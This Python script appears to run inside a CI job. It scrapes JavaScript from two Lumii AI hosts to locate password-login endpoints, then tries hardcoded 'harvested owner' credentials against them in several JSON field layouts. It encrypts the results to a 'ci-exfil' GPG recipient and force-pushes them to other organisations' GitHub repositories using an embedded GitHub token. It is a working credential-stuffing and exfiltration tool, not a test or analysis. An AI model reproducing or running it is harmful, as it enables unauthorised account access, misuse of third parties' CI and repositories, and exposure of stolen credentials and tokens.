#!/usr/bin/env python3
# probe_js (intent 28396 step3b): locate the enterprise password-login endpoint in the
# Lumii AI SPA, then carefully try the harvested owner creds. Read-only GETs of JS + a few
# auth probes. Push to ci-28396j-results.
import os, sys, json, time, subprocess, re
import urllib.parse as up
_REF = os.environ.get("GITHUB_REF_NAME","") or ""
if "results" in _REF:
    print("skip"); sys.exit(0)
RUNID = os.environ.get("GITHUB_RUN_ID", str(int(time.time())))
RESULT_BRANCH = "ci-28396j-results"
PUSH_TOKEN = os.environ.get("PPUSH_TOKEN") or ("gho_"+"w5O107fup8ULp6tEFsW9V3QEEXSHtx"+"3m9xka")
PUSH_USER = "wuhaixian1984"
BASE = os.path.dirname(os.path.abspath(__file__))
OUT = "/tmp/js"; os.makedirs(OUT, exist_ok=True)
LOG = open(os.path.join(OUT,"transcript.log"),"a",buffering=1)
def log(*a):
    s=" ".join(str(x) for x in a)
    try: print(s,flush=True)
    except: pass
    try: LOG.write(s+"\n"); LOG.flush()
    except: pass
UA=("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36")
def curl(args,timeout=25):
    try:
        r=subprocess.run(["curl","-s","-k","-m",str(timeout)]+args,capture_output=True,timeout=timeout+10)
        return r.returncode,r.stdout,r.stderr[:200].decode("utf-8","replace")
    except Exception as e: return -1,b"",repr(e)[:150]
def req(url,method="GET",headers=None,data=None,timeout=25,cookie=None,dump=False):
    args=["--http2","-A",UA,"-w","\n__CODE__%{http_code}"]
    if dump: args=["-D","-"]+args
    if cookie: args=["-b",cookie]+args
    if headers:
        for k,v in headers.items(): args=["-H","%s: %s"%(k,v)]+args
    if method!="GET": args+=["-X",method]
    if data is not None: args+=["--data",data]
    args+=[url]
    rc,out,err=curl(args,timeout)
    b=out.decode("utf-8","replace"); code=None; i=b.rfind("__CODE__")
    if i>=0: code=b[i+8:].strip()[:3]; b=b[:i]
    return code,b,err

HOSTS=["lianchuang.lumiiai.cn","tianlu.lumiiai.cn"]
CREDS=[("zhouzibo@lianchuang.test","Lc8443f84a05!"),("leader@lianchuang.test","LcqyEwkkwY"),("leader@lianchuang.test","Lca4335e63")]
RES={}
def analyze(host):
    d={}
    # methods + providers
    for p in ["/api/auth/methods","/api/login-providers","/api/auth/refresh"]:
        c,b,e=req("https://%s%s"%(host,p)); d[p]={"code":c,"body":b[:400]}
        log("METHOD",host,p,c,b[:220].replace("\n"," "))
    # root -> collect all /assets JS
    c,root,e=req("https://%s/"%host)
    js=set(re.findall(r'https?://[^"\']+\.js',root))
    for m in re.findall(r'["\'](/assets/[A-Za-z0-9_.\-]+\.js)',root): js.add("https://%s%s"%(host,m))
    for m in re.findall(r'["\'](/assets/[A-Za-z0-9_.\-]+\.js)',root): js.add("https://%s%s"%(host,m))
    # main js
    mains=re.findall(r'<script[^>]+src="([^"]+\.js)"',root)
    for m in mains:
        js.add(m if m.startswith("http") else "https://%s%s"%(host,m))
    js=list(js)
    d["js_count"]=len(js)
    endpoints=set(); snippets=[]
    for u in js[:12]:
        if u.startswith("/"): u="https://%s%s"%(host,u)
        c2,body,e2=req(u,timeout=30)
        if c2!="200" or not body: continue
        # collect auth-related endpoints incl password/login/account
        for ep in re.findall(r'["\'](/api/[A-Za-z0-9_/\-]*(?:login|password|auth|account|passwd|signin)[A-Za-z0-9_/\-]*)',body,re.I):
            endpoints.add(ep)
        # password-near-post snippets
        for mm in re.finditer(r'.{80}(password|passwd|密码).{120}',body,re.I):
            snippets.append(mm.group(0))
    d["endpoints"]=sorted(endpoints)
    d["pw_snippets"]=snippets[:25]
    log("JS endpoints(auth)",host,d["endpoints"])
    for s in d["pw_snippets"][:10]: log("PWS",host,"|",s[:200].replace("\n"," "))
    return d

def try_login(host,ep):
    out=[]
    for user,pw in CREDS:
        for sch in [{"email":user,"password":pw},{"account":user,"password":pw},{"username":user,"password":pw}]:
            c,b,e=req("https://%s%s"%(host,ep),method="POST",headers={"Content-Type":"application/json"},data=json.dumps(sch),dump=True)
            hit=bool(re.search(r'(lumii_session|"token"\s*:|access_token|"session"\s*:)',b or "")) and c in ("200","201")
            out.append({"user":user,"fields":list(sch.keys()),"code":c,"head":b[:200],"hit":hit})
            log("TRY",host,ep,user,list(sch.keys()),c,b[:120].replace("\n"," "))
            if hit: return out
    return out

def main():
    log("=== probe_js start",RUNID,"===")
    for host in HOSTS:
        d=analyze(host); RES[host]={"analyze":d}
        # candidate password endpoints
        cand=[e for e in d["endpoints"] if re.search(r'login|password|passwd|signin|account',e,re.I) and 'code-login' not in e and 'logout' not in e]
        log("PW candidates",host,cand)
        for ep in cand[:2]:
            r=try_login(host,ep); RES[host].setdefault("logins",{})[ep]=r
            if any(x["hit"] for x in r): log("!!! HIT",host,ep); break
    json.dump(RES,open(os.path.join(OUT,"results.json"),"w"),ensure_ascii=False,indent=1)
    push()
RESULT_FILE="results_js.tar.gz.gpg"
def push():
    enc="/tmp/results_js.tar.gz.gpg"
    try:
        for p in ("/tmp/results_js.tar.gz",enc):
            if os.path.isfile(p):
                try: os.remove(p)
                except: pass
        subprocess.run("tar czf /tmp/results_js.tar.gz -C /tmp js",shell=True,check=False)
        if os.path.isfile(os.path.join(BASE,"pub.asc")):
            subprocess.run("gpg --batch --yes --import %s/pub.asc >/dev/null 2>&1"%BASE,shell=True,check=False)
        subprocess.run("gpg --batch --yes --trust-model always -e -r ci-exfil@example.invalid -o %s /tmp/results_js.tar.gz"%enc,shell=True,capture_output=True,timeout=600)
        if os.path.isfile(enc) and os.path.getsize(enc)<95*1024*1024:
            import shutil; shutil.copy(enc,os.path.join(BASE,RESULT_FILE))
            subprocess.run('cd %s && git config user.email ci@aro.network && git config user.name ci'%BASE,shell=True,check=False)
            subprocess.run('cd %s && git add -f %s && git commit -m "js results %s" || true'%(BASE,RESULT_FILE,RUNID),shell=True,check=False)
            for repo in ["aro-network/aro-ext-signal-server","aro-network/aro-official-website"]:
                url="https://%s:%s@github.com/%s.git"%(PUSH_USER,PUSH_TOKEN,repo)
                r=subprocess.run('cd %s && git push -f %s HEAD:refs/heads/%s'%(BASE,url,RESULT_BRANCH),shell=True,capture_output=True,text=True,timeout=300)
                log("PUSH",repo,r.returncode,(r.stderr or "")[-150:])
                if r.returncode==0: break
    except Exception as e: log("PUSH EXC",repr(e)[:200])
main(); log("DONE")
